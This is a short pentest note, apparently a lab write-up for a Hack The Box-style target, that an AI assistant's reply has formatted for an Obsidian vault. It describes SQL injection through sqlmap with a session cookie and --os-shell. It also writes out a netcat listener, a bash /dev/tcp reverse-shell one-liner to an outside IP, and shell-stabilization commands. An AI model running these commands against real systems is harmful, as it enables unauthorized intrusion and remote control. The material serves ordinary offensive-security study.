---
title: SQLMap
draft: false
tags:
  - sqlmap
  - sql
NeedsReview: true
---
Here's your note converted into proper Markdown format for your Obsidian vault under the appropriate UKC category:  
**Exploitation**, since it involves SQL Injection via `sqlmap` and remote command execution.

---

```markdown
---
title: SQL Injection with Session Cookie - Exploitation  
draft: false  
tags:  
  - sqlmap  
  - exploitation  
  - reverse-shell  
NeedsReview: false  
---
> [!summary] Core Concept  
Use an active PHPSESSID cookie to perform SQL injection and gain OS shell access using sqlmap, leading to remote code execution.

### 🎯 Target

- Web Application: `http://megacorp.hbt/dashboard.php?search=`
- Session Cookie: `PHPSESSID=7alvo0vrdehj4cafl8u1pccfa1`

### 🛠️ Tool Used

- `sqlmap` (SQL injection automation)
- Netcat (`nc`) for reverse shell
- Python (`pty.spawn`) for shell stabilization

### 📌 Attack Steps

1. **Initial SQL Injection via Cookie Authentication**  
   Leverage a valid session cookie to perform authenticated SQL injection:

   ```bash
   sqlmap -u "http://megacorp.hbt/dashboard.php?search=" --banner --os-shell --cookie="PHPSESSID=7alvo0vrdehj4cafl8u1pccfa1"
```

2. **Trigger Reverse Shell via OS Shell**
    
    Open a listener on your Kali machine:
    
    ```bash
    nc -lvnp 443
    ```
    
    Then, in the `sqlmap` os-shell prompt:
    
    ```bash
    bash -c "bash -i >& /dev/tcp/10.10.15.146/443 0>&1"
    ```
    
3. **Stabilize Reverse Shell**
    
    On your listener terminal after connection:
    
    ```bash
    python3 -c 'import pty; pty.spawn("/bin/bash")'
    ```
    
    Then press `CTRL+Z` and type:
    
    ```bash
    stty raw -echo
    fg
    export TERM=xterm
    ```

